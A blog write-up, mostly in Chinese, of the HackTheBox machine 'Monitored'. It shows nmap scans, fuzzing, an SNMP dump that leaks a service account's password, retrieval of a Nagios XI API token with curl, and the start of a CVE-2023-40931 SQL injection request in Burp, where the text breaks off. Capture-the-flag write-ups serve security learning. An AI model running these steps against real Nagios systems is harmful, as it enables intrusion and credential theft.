@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Monitored0x1 Nmap TCP12345678910111213141516171819202122232425262728293031323334$ su">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Monitored">
+<meta property="og:url" content="https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Monitored0x1 Nmap TCP12345678910111213141516171819202122232425262728293031323334$ su">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114123904-lyhrncu.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114123956-aw7ebgo.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114154314-7oudnfi.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114155043-untrpqq.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114144634-f399mu5.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114171654-anea797.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114172015-jaed39g.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114172027-i60otlq.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114173936-4vv4z2k.png">
+<meta property="article:published_time" content="2024-01-14T10:06:00.000Z">
+<meta property="article:modified_time" content="2024-06-03T04:54:13.194Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114123904-lyhrncu.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Monitored</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/01/21/2024-htb-machine/03-Analysis/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/01/09/2024-htb-machine/01-Bizness/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&text=HackTheBox - Machine - Monitored"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&title=HackTheBox - Machine - Monitored"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&is_video=false&description=HackTheBox - Machine - Monitored"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Monitored&body=Check out this article: https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&title=HackTheBox - Machine - Monitored"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&title=HackTheBox - Machine - Monitored"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&title=HackTheBox - Machine - Monitored"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&title=HackTheBox - Machine - Monitored"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&name=HackTheBox - Machine - Monitored&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/01/14/2024-htb-machine/02-Monitored/&t=HackTheBox - Machine - Monitored"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Monitored
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-01-14T10:06:00.000Z" class="dt-published" itemprop="datePublished">2024-01-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Monitored"><a href="#Monitored" class="headerlink" title="Monitored"></a>Monitored</h1><h2 id="0x1-Nmap-TCP"><a href="#0x1-Nmap-TCP" class="headerlink" title="0x1 Nmap TCP"></a>0x1 Nmap TCP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -p- -sS -sC -sV -oA nmap --min-rate=1000 -vv -T5 10.129.61.234</span><br><span class="line">PORT     STATE SERVICE    REASON         VERSION</span><br><span class="line">22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/xFgJTbVC36GNHaE0GG4n/bWZGaD2aE7lsFUvXVdbINrl0qzBPVCMuOE1HNf0LHi09obr2Upt9VURzpYdrQp/7SX2NDet9pb+UQnB1IgjRSxoIxjsOX756a7nzi71tdcR3I0sALQ4ay5I5GO4TvaVq+o8D01v94B0Qm47LVk7J3mN4wFR17lYcCnm0kwxNBsKsAgZVETxGtPgTP6hbauEk/SKGA5GASdWHvbVhRHgmBz2l7oPrTot5e+4m8A7/5qej2y5PZ9Hq/2yOldrNpS77ID689h2fcOLt4fZMUbxuDzQIqGsFLPhmJn5SUCG9aNrWcjZwSL2LtLUCRt6PbW39UAfGf47XWiSs/qTWwW/yw73S8n5oU5rBqH/peFIpQDh2iSmIhbDq36FPv5a2Qi8HyY6ApTAMFhwQE6MnxpysKLt/xEGSDUBXh+4PwnR0sXkxgnL8QtLXKC2YBY04jGG0DXGXxh3xEZ3vmPV961dcsNd6Up8mmSC43g5gj2ML/E=</span><br><span class="line">|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBbeArqg4dgxZEFQzd3zpod1RYGUH6Jfz6tcQjHsVTvRNnUzqx5nc7gK2kUUo1HxbEAH+cPziFjNJc6q7vvpzt4=</span><br><span class="line">|   256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5o+WJqnyLpmJtLyPL+tEUTFbjMZkx3jUUFqejioAj7</span><br><span class="line">80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.56</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to https://nagios.monitored.htb/</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">389/tcp  open  ldap       syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">443/tcp  open  ssl/http   syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">|_http-title: Nagios XI</span><br><span class="line">| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb</span><br><span class="line">| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2023-11-11T21:46:55</span><br><span class="line">| Not valid after:  2297-08-25T21:46:55</span><br><span class="line">| MD5:   b36a:5560:7a5f:047d:9838:6450:4d67:cfe0</span><br><span class="line">| SHA-1: 6109:3844:8c36:b08b:0ae8:a132:971c:8e89:cfac:2b5b</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">5667/tcp open  tcpwrapped syn-ack ttl 63</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-Nmap-UDP"><a href="#0x2-Nmap-UDP" class="headerlink" title="0x2 Nmap UDP"></a>0x2 Nmap UDP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -p- -sU -sC -sV -oA nmap.udp --min-rate=3000 -vv -T5 10.129.61.234</span><br><span class="line">PORT    STATE SERVICE REASON</span><br><span class="line">123/udp open  ntp     udp-response ttl 63</span><br><span class="line">161/udp open  snmp    udp-response ttl 63</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x3-Sub-domain-ffuf"><a href="#0x3-Sub-domain-ffuf" class="headerlink" title="0x3 Sub-domain ffuf"></a>0x3 Sub-domain ffuf</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u <span class="string">&quot;https://10.129.61.234&quot;</span> -H <span class="string">&quot;Host: FUZZ.monitored.htb&quot;</span>  -w /Tools/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt  -fs 3245</span><br><span class="line">結果什麽也沒有</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x4-snmp-enum"><a href="#0x4-snmp-enum" class="headerlink" title="0x4 snmp enum"></a>0x4 snmp enum</h2><p>看到snmp又在運行，所以打算隨手dump一下看看，沒想到還真的有賬號密碼。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ snmpwalk -v 1 -c public IP | <span class="built_in">tee</span> snmp.txt</span><br><span class="line">...</span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.1367 = STRING: <span class="string">&quot;-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB&quot;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>然後看到有一行賬號密碼</p>
+<p>無法登錄這裏：<a target="_blank" rel="noopener" href="https://nagios.monitored.htb,/">https://nagios.monitored.htb，</a></p>
+<p>如果輸入 <code>svc:XjH7VCehowpR1xZB</code>​，會顯示 <code>The specified user account has been disabled or does not exist.</code>​</p>
+<p>但是輸入 <code>svc:mane</code>​，會顯示 <code>Invalid username or password.</code>​ </p>
+<p>也就是說這個賬號被禁止了，然後這個賬號密碼是正確的。</p>
+<p>於是谷歌查了一下</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114123904-lyhrncu.png" alt="image">​</p>
+<p>看到有第二個url，打開<a target="_blank" rel="noopener" href="https://nagios.monitored.htb/nagios">https://nagios.monitored.htb/nagios</a> 需要登陸，於是乎輸入 <code>svc XjH7VCehowpR1xZB</code>​  結果進去了。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/02-Monitored-Klut0mG4NJ4P68Zg/image-20240114123956-aw7ebgo.png" alt="image">​</p>
+<h2 id="0x5-神奇的API"><a href="#0x5-神奇的API" class="headerlink" title="0x5 神奇的API"></a>0x5 神奇的API</h2><p>左下角有一個 <code>Configuration</code>​ 點進去之後 <code>Object Type: Commands</code>​ 可以看到一系列的command，但是這些好像都運行不了。</p>
+<p>網上搜索 Nagios XI vulnerabilities，看到一些文章，其中最有用的如下：</p>
+<blockquote>
+<h3 id="1-SQL-Injection-in-Banner-acknowledging-endpoint-CVE-2023-40931"><a href="#1-SQL-Injection-in-Banner-acknowledging-endpoint-CVE-2023-40931" class="headerlink" title="1. SQL Injection in Banner acknowledging endpoint (CVE-2023-40931)"></a>1. SQL Injection in Banner acknowledging endpoint (CVE-2023-40931)</h3><p>Nagios XI features “Announcement Banners<a href="">”,</a> which can optionally be acknowledged by users. The endpoint for this feature is vulnerable to a SQL Injection attack.</p>
+<p>When a user acknowledges a banner, a POST request is sent to <code>/nagiosxi/admin/banner_message-ajaxhelper.php</code>​ with the POST data consisting of the intended action and message ID – <code>action=acknowledge banner message&amp;id=3</code>​.</p>
+<p>The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the <code>xi_session</code>​ and <code>xi_users</code>​ table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.</p>
+<p>This vulnerability does not require the existence of a valid announcement banner ID, meaning it can be exploited by an attacker at any time.</p>
+<p><a target="_blank" rel="noopener" href="https://outpost24.com/blog/nagios-xi-vulnerabilities/">https://outpost24.com/blog/nagios-xi-vulnerabilities/</a></p>
+</blockquote>
+<p>根據提示前往這裏：<code>https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php</code>​ 提示：<code>Your session has timed out.</code>​ 看到這個API是存在的，也就是説需要登陸才可以使用這個API。</p>
+<p>所以現在的思路是：找辦法登錄， 然後使用這個API，然後去使用sql注入。</p>
+<p>既然上面的svc用戶被禁用了，那麽能不能用api去拿到token呢？</p>
+<p>但是現在不知道API的路徑，所以谷歌找一下有沒有什麽綫索。</p>
+<p>關鍵字：<code>nagios xi api url</code>​ ，看到這篇：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://server_ip_or_hostname/nagiosxi/api/v1">https://server_IP_or_HOSTNAME/nagiosxi/api/v1</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ibm.com/docs/en/cabi/1.1.2?topic=products-configuring-nagios-xi-connector-sources">https://www.ibm.com/docs/en/cabi/1.1.2?topic=products-configuring-nagios-xi-connector-sources</a></p>
+</blockquote>
+<p>然後curl隨便訪問一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -k https://nagios.monitored.htb/nagiosxi/api/v1/</span><br><span class="line">&#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;No request was made&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">$ curl -k https://nagios.monitored.htb/nagiosxi/api/v1/111</span><br><span class="line">&#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;No API Key provided&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>果然是API服務器，所以乾脆FFUF看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u <span class="string">&quot;https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ&quot;</span>  -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -fs 32</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 3714ms]</span><br><span class="line">    * FUZZ: license</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 911ms]</span><br><span class="line">    * FUZZ: authenticate</span><br><span class="line"></span><br><span class="line">:: Progress: [17770/17770] :: Job [1/1] :: 38 req/sec :: Duration: [0:09:08] :: Errors: 0 ::</span><br></pre></td></tr></table></figure>
+
+<p>看到只有兩個選擇，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ curl -k https://nagios.monitored.htb/nagiosxi/api/v1/license</span><br><span class="line">&#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Unknown API endpoint.&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">$ curl -k https://nagios.monitored.htb/nagiosxi/api/v1/license1</span><br><span class="line">&#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;No API Key provided&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">$ curl -k https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</span><br><span class="line">&#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;You can only use POST with authenticate.&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">$ curl -k -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</span><br><span class="line">&#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Must be valid username and password.&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​<code>license</code>​ 看起來什麽也沒有，<code>authenticate</code>​ 到時候可以，不過抱著好奇心試了下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ curl -XPOST -k -L <span class="string">&#x27;http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1&#x27;</span> -d <span class="string">&#x27;username=svc&amp;password=XjH7VCehowpR1xZB&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;svc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user_id&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;auth_token&quot;</span>: <span class="string">&quot;0998624385183fb95f4e9cc16ba91d781e3ca59a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;valid_min&quot;</span>: 5,</span><br><span class="line">    <span class="string">&quot;valid_until&quot;</span>: <span class="string">&quot;Sun, 14 Jan 2024 02:07:59 -0500&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到了不知道用來幹嘛的 <code>auth_token</code>​ ，於是想起了開頭的CVE。</p>
+<h2 id="0x6-CVE-2023-40931"><a href="#0x6-CVE-2023-40931" class="headerlink" title="0x6 CVE-2023-40931"></a>0x6 CVE-2023-40931</h2><p>根據提示用瀏覽器訪問：<code>https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php</code>​ ，然後用burp劫持。</p>
+<p>改成post后加上<code>action=acknowledge_banner_message&amp;id=3</code>​ 但是還是超時，所以乾脆加上token看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1</span><br><span class="line">Host: nagios.monitored.htb</span><br><span class="line">Cookie: nagiosxi=ctna7q7o34obipl929pb0935ld</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: 